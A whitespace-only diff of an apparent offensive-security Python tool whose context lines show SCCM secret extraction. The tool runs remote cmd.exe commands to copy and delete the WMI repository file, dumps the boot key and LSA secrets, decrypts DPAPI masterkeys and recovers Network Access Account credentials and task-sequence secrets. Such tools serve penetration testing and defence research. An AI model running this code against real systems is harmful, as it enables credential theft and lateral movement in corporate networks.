@@ -41,7 +41,7 @@ class DPAPIHunter:
         self.dumpAll = both
         self.dumpWmi = wmi
         self.dumpDisk = disk
-        
+
 
         if self.hashes:
             if self.hashes.find(":") != -1:
@@ -53,7 +53,7 @@ class DPAPIHunter:
 
 
         self.smb = SMB(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.debug, self.kdc)
-        self.dpapi = DPAPI(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.debug, self.kdc, self.smb)        
+        self.dpapi = DPAPI(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.debug, self.kdc, self.smb)
         self.wmi = WMI(self.target, self.username, self.password, self.domain, self.doKerberos, self.no_pass, self.hashes, self.aes, self.kdc, self.dpapi, self.logs_dir)
 
     def run(self):
@@ -66,13 +66,13 @@ class DPAPIHunter:
             self.dump_disk()
         else:
             logger.info("[-] No operation specified")
-        
+
         self.cleanup()
-        
+
     def dump_wmi(self):
         print()
         logger.info("[*] Starting SCCM secrets extraction via WMI\n")
-        
+
         # https://github.com/garrettfoster13/sccmhunter/pull/32
         namespace = 'root\\ccm\\Policy\\Machine\\ActualConfig'
 
@@ -86,18 +86,18 @@ class DPAPIHunter:
 
         for query in queries:
             iEnum = iWbemServices.ExecQuery(query)
-            self.wmi.parseReply(iEnum)     
+            self.wmi.parseReply(iEnum)
 
         if self.wmi.found_naa_credentials is False and self.wmi.found_task_sequence is False and self.wmi.found_collection_variables:
             logger.info(f"[!] No SCCM secrets found using WMI, try -disk dump")
             #return # would exit, but possibility of disk dump
         else:
             logger.debug(f"[*] Got SCCM secrets from WMI namespace '{namespace}'")
-        
+
         print()
         logger.info("[*] WMI SCCM secrets dump complete")
         self.wmi.disconnect()
-        return      
+        return
 
     def dump_disk(self):
         print()
@@ -107,30 +107,30 @@ class DPAPIHunter:
 
         share = 'C$'
         original_filepath = 'Windows\\System32\\wbem\\Repository\\OBJECTS.DATA'
-        filename = 'OBJECTS.DATA'       
+        filename = 'OBJECTS.DATA'
 
         logger.debug(f"[*] Copying the OBJECTS.DATA file to C:\\Windows\\Temp\\{filename}")
-        
+
         self.wmi.exec(f"cmd.exe /Q /c copy \"C:\\{original_filepath}\" \"C:\\Windows\\Temp\\{filename}\"")
         time.sleep(2)
-        
+
         temp_filepath = 'Windows\\Temp\\'
         data = self.smb.getFileContent(share, temp_filepath, filename)
 
         result = self.parseFile(data)
 
         if result:
-            logger.info("[*] SCCM secrets dump complete")     
+            logger.info("[*] SCCM secrets dump complete")
         else:
             logger.info("[!] No SCCM secrets found in CIM Repository.")
-        
+
         logger.debug("[*] Deleting the OBJECTS.DATA file from C:\\Windows\\Temp")
         self.wmi.exec(f"cmd.exe /Q /c del \"C:\\Windows\\Temp\\{filename}\"")
 
     def parseFile(self, data) -> None:
 
         foundCreds = False
-        
+
         if(data is None):
             logger.info("[!] Unable to retrieve the OBJECTS.DATA file.")
             return
@@ -141,7 +141,7 @@ class DPAPIHunter:
             "Collection Variables": br"CCM_CollectionVariable\x00\x00(?P<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version=\"1\"><!\[CDATA\[(?P<CollectionVariableValue>.*?)\]\]><\/PolicySecret>",
             "Other Secrets": br"<PolicySecret Version=\"1\"><!\[CDATA\[(?P<OtherSecret>.*?)\]\]><\/PolicySecret>"
         }
-        
+
         for sccm_data_type, regex in regex_dict.items():
             logger.debug(f"[*] Looking for {sccm_data_type}")
 
@@ -170,7 +170,7 @@ class DPAPIHunter:
                                 continue
             else:
                 continue
-        
+
         return foundCreds
 
     def cleanup(self):
@@ -180,8 +180,8 @@ class DPAPIHunter:
 class DPAPI:
     def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                  no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None, smb_instance=None):
-        
-        
+
+
         self.target = remoteName
         self.username = username
         self.password = password
@@ -205,21 +205,21 @@ class DPAPI:
 
         self.bootKey = None
         self.remote_ops = None
-        self.lsa_secrets = None 
+        self.lsa_secrets = None
 
     def triage_masterkey(self, mkid = None):
-        
+
         try:
             # retrieve masterkey file contents
             logger.debug("[*] Retrieving masterkey file: " + mkid)
             self.raw_masterkeys[mkid] = self.smb.getFileContent(self.share, self.mk_path, mkid)
-            
+
             # if we can't retrieve the masterkey file, we exit
             if self.raw_masterkeys[mkid] is None:
                 logger.info(f"[!] Could not get content of masterkey file: {mkid}, exiting since we can't decrypt the blob.")
                 self.smb.smb_conn.disconnectTree(self.tid)
                 sys.exit(1)
-            
+
             # if we can retrieve the masterkey file, then we proceed to extract the bootkey
             logger.debug("[*] Attempting to extract bootkey from the target machine")
             try:
@@ -229,8 +229,8 @@ class DPAPI:
                 self.bootKey = self.remote_ops.getBootKey()
             except Exception as e:
                 logger.info('[!] RemoteOperations failed: %s' % str(e))
-            
-            
+
+
             # with the bootkey, we can now extract LSA Secrets
             logger.debug('[*] Attempting to dump LSA secrets from the target machine')
             try:
@@ -244,13 +244,13 @@ class DPAPI:
                     import traceback
                     traceback.print_exc()
                 logger.info('[!] LSA hashes extraction failed: %s' % str(e))
-            
-            self.cleanup()          
-            
+
+            self.cleanup()
+
             # debug, print SYSTEM user key
             # logger.debug(f"User Key: {self.dpapiSystem['UserKey']}")
             # logger.debug(f"Machine Key: {self.dpapiSystem['MachineKey']}")
-            
+
 
             # now that we have the SYSTEM user key, we can decrypt the masterkey
             if self.dpapiSystem['UserKey'] is None:
@@ -286,30 +286,30 @@ class DPAPI:
                 self.cleanup()
             except:
                 pass
-        
+
         #self.cleanup()
-        
+
         return
 
-    def decrypt_blob(self, dpapi_blob=None) -> str:      
+    def decrypt_blob(self, dpapi_blob=None) -> str:
 
         # Identify the masterkey from the blob
         blob = DPAPI_BLOB(dpapi_blob)
         mkid = bin_to_string(blob['GuidMasterKey'])
-        
+
         # If we don't have the masterkey, we triage it
         if mkid not in self.raw_masterkeys:
             self.triage_masterkey(mkid)
-        
+
         key = self.masterkeys.get(mkid, None)
         if key is None:
             logger.info("[!] Could not decrypt masterkey " + mkid)
             return None
-        
-        
+
+
         decrypted = blob.decrypt(key)
         decoded_string = decrypted.decode('utf-16le').replace('\x00', '').replace('\\\\', '\\')
-        
+
         #logger.info(f"Decrypted SCCM secret: {decoded_string}")
         return decoded_string
 
@@ -376,7 +376,7 @@ class SMB:
 
         self.smb_conn = None
 
-        
+
         self.connect()
         self.is_admin()
 
@@ -405,7 +405,7 @@ class SMB:
                 import traceback
                 traceback.print_exc()
                 logging.debug(str(e))
-        
+
         #logger.debug("[*] SMB Connection Established!")
         return self.smb_conn
 
@@ -450,7 +450,7 @@ class WMI:
 
         self.dpapi = dpapi_instance
         self.logs_dir = logs_dir
-       
+
         self.found_naa_credentials = False
         self.found_task_sequence = False
         self.found_collection_variables = False
@@ -510,7 +510,7 @@ class WMI:
         logger.debug("[*] WMI Command Execution Finished!")
 
     def query(self, namespace, query) -> wmi.IEnumWbemClassObject:
-           
+
         try:
             logger.debug(f"[*] Querying WMI Namespace: {namespace}")
             iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
@@ -527,7 +527,7 @@ class WMI:
                 self.dcom.disconnect()
             except:
                 pass
-    
+
     def disconnect(self):
         logger.debug(f"[*] Closing DCOM connection to {self.target}")
         try:
@@ -546,7 +546,7 @@ class WMI:
                 record = pEnum.getProperties()
 
                 if 'NetworkAccessUsername' in record and 'NetworkAccessPassword' in record:
-                    
+
                     if self.found_naa_credentials is False:
                         self.found_naa_credentials = True
                         logger.info("[+] Found NAA credentials")
@@ -562,7 +562,7 @@ class WMI:
                     if self.found_task_sequence is False:
                         self.found_task_sequence = True
                         logger.info("[+] Found Task Sequence")
-                
+
                     unparsed_task_sequence = record.get('TS_Sequence', {}).get('value', None)
                     task_sequence_decrypted = self.dpapi.decrypt_blob(unhexlify(re.match(regex, unparsed_task_sequence).group(1))[4:])
                     SCCMSecret("Task Sequence", None, task_sequence_decrypted).dump()
